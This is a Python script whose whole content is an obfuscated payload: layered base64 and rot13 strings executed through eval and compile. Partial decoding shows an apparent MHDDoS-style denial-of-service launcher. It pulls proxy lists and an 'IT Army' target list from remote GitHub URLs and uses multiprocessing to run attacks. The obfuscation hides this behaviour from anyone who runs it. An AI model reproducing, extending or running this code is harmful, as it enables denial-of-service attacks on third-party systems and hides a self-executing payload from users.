import base64, codecs
magic = 'aW1wb3J0IGJhc2U2NCwgY29kZWNzDQptYWdpYyA9ICdabkp2YlNCaGMzbHVZMmx2TG14dlp5QnBiWEJ2Y25RZ2JHOW5aMlZ5SUdGeklHRnplVzVqYVc5ZmJHOW5aMlZ5Q21aeWIyMGdZMjl1ZEdWNGRHeHBZaUJwYlhCdmNuUWdjM1Z3Y0hKbGMzTUthVzF3YjNKMElHeHZaMmRwYm1jS1puSnZiU0J0ZFd4MGFYQnliMk5sYzNOcGJtY2dhVzF3YjNKMElHTndkVjlqYjNWdWRBcG1jbTl0SUhCaGRHaHNhV0lnYVcxd2IzSjBJRkJoZEdnS1puSnZiU0IwZVhCcGJtY2dhVzF3YjNKMElFOXdkR2x2Ym1Gc0xDQlVkWEJzWlFwcGJYQnZjblFnZDJGeWJtbHVaM01LQ21aeWIyMGdZMjlzYjNKaGJXRWdhVzF3YjNKMElFWnZjbVVLQ2dwM1lYSnVhVzVuY3k1bWFXeDBaWEozWVhKdWFXNW5jeWdpYVdkdWIzSmxJaWtLQ2dwamJHRnpjeUJTWlcxdmRtVlZjMlZzWlhOelYyRnlibWx1WjNNb2JHOW5aMmx1Wnk1R2FXeDBaWElwT2dvZ0lDQWdaR1ZtSUdacGJIUmxjaWh6Wld4bUxDQnlaV052Y21RcE9nb2dJQ0FnSUNBZ0lISmxkSFZ5YmlCaGJHd29LQW9nSUNBZ0lDQWdJQ0FnSUNBaWMyOWphMlYwTG5ObGJtUW9LU0J5WVdselpXUWdaWGhqWlhCMGFXOXVMaUlnYm05MElHbHVJSEpsWTI5eVpDNW5aWFJOWlhOellXZGxLQ2tzQ2lBZ0lDQWdJQ0FnSUNBZ0lDSlRVMHdnWTI5dWJtVmpkR2x2YmlCcGN5QmpiRzl6WldRaUlHNXZkQ0JwYmlCeVpXTnZjbVF1WjJWMFRXVnpjMkZuWlNncENpQWdJQ0FnSUNBZ0tTa0tDZ3BNVDBkSFJWSmZUVk5IWDBaUFVrMUJWQ0E5SUNkYkpTaGhjMk4wYVcxbEtYTWdMU0FsS0d4bGRtVnNibUZ0WlNselhTQWxLRzFsYzNOaFoyVXBjeWNLVEU5SFIwVlNYMFJCVkVWZlJrOVNUVUZVSUQwZ0lpVklPaVZOT2lWVElnb0tiRzluWjJsdVp5NWlZWE5wWTBOdmJtWnBaeWhtYjNKdFlYUTlURTlIUjBWU1gwMVRSJw0KbG92ZSA9ICcxOVRHMVdBRElEZlZURXVxVEl6b0tEOUdSOVVFMElGSzBFT0lSSXNFeDlGR0hTSFhEY2ZvMnFhTUtWdENGT2ZvMnFhbko1YVl6cX'
love = 'ykHzgcGGWkrKO2qTSiFaI4GID5oHfmGzSLETAzomWkLH1YIzujZxxjE1EWZx1XnzWKZUyPEKt4LIuRLyuJoR9OGRcarIMHH21lFwI3oxb4qT9HBJSAZxyfIyEFqT9HrGOkITg5IyEKL3SDG2MAF0SgIyD1nJ5YDGIDryAgpxb1q25XBKAiIQyuGGWWoSy6H3uAHx1wo1ISrKO2qHMAFwScpKcWFKNlFJMAF0SgFGWGoT96rJuAZ1cvJRM4JSO0L3uAFxk0pQWWZUSYG3AkZwyfowWWoRfln2yAZaS5pUM1naO6BKqAF0SgFmW5nR1HFGEPqx9QpSISL28lAKIiH2qVpHgCMx1WM2AiLHEzIyE5nUSGZKSLEx5aD3MCDz8lAKyPqTW0IyOBqT5XGUEjIIqcGQWWoKNkBJAirxI5pyOCL3OfG0WiZwI5DaMCoR1YEGSjrwELIyOBqSMHrJuAHTc0pID5ZRkXnaEQEx9dpUb5q01YDJ1YZaybGIEWASO2GaEJHR96omAKM0kYEGOAF1M0D0MCMz8lpJShFwIuJKuAnKO6ZKIkIHI5pUM0JSMDGaEJHR50IyOCryM5MmqhFwI4p0L5A3SHBGOZFzf5F0MCA0qFBIISZRyTFmNkE0HkBIEUZIqOERySBIM2naEAISZjGHcAM3SEZIcUZUSIEHyKp0IFH0uSFGyHEmSKDHEWETADqx50IyOCZ25YEJWJIHRkpSICoR1YDJ1LHxx0GQWWnaSHrJyiqat2HUMBqSMDGaEJHR50o1D5LH0lFJkMLH91pUcWnUSDAJWZFwI4o1EWoUNkMzcYEwIgGHgSIT8mI2qZF0HjGHgJLx16BJkiFyZjpIEWoSuRLyuDrIqQEmSSp0IFrHMJHGO0FSEGZT5DqKAYZx1wo1EWp0gfrTujISAfGHb1ZSyuG3IjrxybpH5vJRuGI0AXHayGFQR5FHu4n0qJHGO0JR5vqSMDGaEKZaHjpIICoHW2BTyjryZmJKckL3SHqGSZLHygGHgKq28lAGOAFwHjJKcOnJ9TBJciZ1pjoyD5Mx1TZKIjZxS5o3cRM0jlWj0XM29xVQ0tW2k1Lz1TqTVlAUMwFRc2MHufMzZlGayMJRWfL2x5qSyKoUIZZ2E2L210pTWgMTMwFRc2MHqfoTA5AGOyFSShGRSiM0yQDJqXZztjMRuPrx9cBUMwoHLmGT1xpTEUnQSMoyM6JyuXnzVlAGOnImHjGT1BqzWGBKqvZ0bjLHp5p1cGZJuwZx5fLz1EqSxloUIvoHM0LwV0qzAVFaMyFTkzLmWBrIyLDzkwnGy0JIqfqHjmMUMwoKEj'
god = 'Ym1kZmNISnZlR2xsY3pJdWRIaDBKeXdLSUNBZ0lDZG9kSFJ3Y3pvdkwzSmhkeTVuYVhSb2RXSjFjMlZ5WTI5dWRHVnVkQzVqYjIwdmNHOXlkR2h2YkdVdFlYTmpaVzVrTFdOcGJtNWhiVzl1TDNCeWIzaDVYM05qY21Gd1pYSXZiV0ZwYmk5M2IzSnJhVzVuWDNCeWIzaHBaWE16TG5SNGRDY3NDaUFnSUNBbmFIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDNCdmNuUm9iMnhsTFdGelkyVnVaQzFqYVc1dVlXMXZiaTl3Y205NGVWOXpZM0poY0dWeUwyMWhhVzR2ZDI5eWEybHVaMTl3Y205NGFXVnpOQzUwZUhRbkxBb3BDa2xVWDBGU1RWbGZRMDlPUmtsSFgxVlNUQ0E5SUNkb2RIUndjem92TDJkcGMzUXVaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDBKcGIyNWxZMWd2TlRjMU9UQXdPRFkyT0Rnek1HWTNZbUV4TUdRNVpXVTVPRFppWVRNeVkyUXZjbUYzTHpjMk1EVTFaV1k0T0dVMk1ESXpaalEzWTJFMk16aGlNRE5rTXpSaFkyUmpaR0ZpWlRReU5HVXZiV2hrYjNOZmRHRnlaMlYwYzE5MFkzQmZkakl1ZEhoMEp3cFdSVkpUU1U5T1gxVlNUQ0E5SUNkb2RIUndjem92TDNKaGR5NW5hWFJvZFdKMWMyVnlZMjl1ZEdWdWRDNWpiMjB2UW1sdmJtVmpXQzl0YUdSa2IzTmZjQzl0WVdsdUwzWmxjbk5wYjI0dWRIaDBKd29LUTFCVlgwTlBWVTVVSUQwZ1kzQjFYMk52ZFc1MEtDa0tSRVZHUVZWTVZGOVVTRkonDQpkZXN0aW55ID0gJ1NESEVHVlEwdEFtSGpaUE9jTXZPUUhTSXNEMDlJR3lEdEN2TmtWVElmcDJIdFpHTmpaTmJYRDFPSUsxT1NIeTlESHg5UUVJQUdWUTB0WnRjUUcwNVRGSHFzRXhJSEQwdXNIeElISHh5U0hsTjlWUUhYRDA5QkV4eVVLME1TSVJBVksxRVdHSElDSUlEdENGTmtBRGNGRUhNRkVJQVZLMDlKRUlXSEZIMVNWUTB0WnZOdFZsT2xvM0lhblRrNVZRSHRvSjlsTUZPbU1KQWlvekVtUHlXU0V5V1NIMHVzSHhTSEVGTjlWUUhYRXhTV0dTSUZFSTlQSUhFVUVJRXNFeFNRSVI5RlZRMHRaamNUREh5WklJV1NLMEVTR1JTTU'
destiny = 'fkDIARZQyPEIAnqRATGzgDrQyPE1A5p0qWrKATFH50D0MBn1cEGyuVZRSJEHuSFHqFFHMYZUyPExySI0EVn3ARZSARERuOI0yGrUEQEx5gHUyOHHMFFIWWFTgGFUx5DHMVAKATFQIKFIZ5IRu4H1SWHayQE3MBBIMEGzunETAUEQO1H0IGFIcSFIqmE0uGGRfjrHWTFHImEKyKG0DkEIqUZQE0D0MBnyy3FSuVZRSJEHuSFHqFFHMYZR1QFUuap0tjDH9UHxu0D0MBoIO4DHAUrQImFSAKD0E4FKAVHxyTExt5HyMEZUEOETAWEIACp0E4H0uRZUImFSWGHHLjFHuVoR45IySFZyO5FIWVHmyGE3t5HRyVGHqYZH9CFHyOH1MEZUEnHQDkHUEvJRjln3IjZ1c0GQWdAyO2GaEJHR9OERukH0q5EH9JHGO0EKb5oR1TAIcTFUSJFIVkG0HjFHWWHyAmEHy0JSMDGaEJHxSAERt0qRATG1EiZ1q5JKueI0HjqHuRZKyCE3x5H0cBLaEJHR50EUueFHITGwyJHx1cpUcVnRqFrIITH0IDE1AWH0fjFHkDqx50IyOCIHu4FIAUqx45IyWAnKO6FTuUHayIEyASIHu4FIAUrGyGFx5vqSMDGaEXFRynE1V5F1MEZUESrwyfGHL1JxMVpIMWH3yGE1WeD0xkBIAXGzW0IyOBqRu4FIWJHGO0EKb5oR1TAIcTFUSJFIAKH0IGBIAXGzW0IyOBqRu4FHqSFHE0D0MCIT8mI3yMrIqGFQOWFSO0CG0aQDcdo3xtCFNaKUt3Zyk4AzMprQp0KUtmZIk4ZmZaQDc0paImqPN9VTI2LJjbW1k4AzEprQLkKUt2A1k4AwyprQLmWlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzAprQMzKUt3Ayk4AwIprQWwKUtlZSk4AzSprQMzKUt3BIk4ZwxaXFNeVTI2LJjbW1k4AwqprQMzKUt2APpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt2AIk4AmAprQp0KUt2BIk4AzIprQp5KUtlL1k4ZwOprQMuKUt2Myk4AmyprQV5WlxAPzI2LJjbL29gpTyfMFuvLKAyAwDhLwL0MTIwo2EyXTI2LJjbW1k4AmEprQplKUt3AIk4AmAprQp0WlxcYPp8p3ElnJ5aCvpfW2I4MJZaXFxAPt=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))